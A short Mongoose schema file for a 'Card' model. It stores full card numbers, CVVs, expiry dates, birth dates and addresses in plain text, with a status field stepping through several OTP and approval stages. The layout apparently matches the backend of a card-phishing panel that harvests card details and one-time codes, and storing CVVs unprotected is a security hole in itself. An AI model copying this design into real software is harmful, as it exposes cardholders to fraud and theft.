const mongoose = require("mongoose");

const cardSchema = new mongoose.Schema({
  cardNumber: String,
  cardName: String,
  expiryMonth: String,
  expiryYear: String,
  cvv: String,
  phoneNumber: String,
  country: String,
  address: String,
  city: String,
  zipCode: String,
  birthDate: String,
  status: {
    type: String,
    enum: ["pending","verify", "otp", "otp2","otp3","otp4",  "app", "accepted", "rejected"],
    default: "pending",
  },
});

module.exports = mongoose.model("Card", cardSchema);
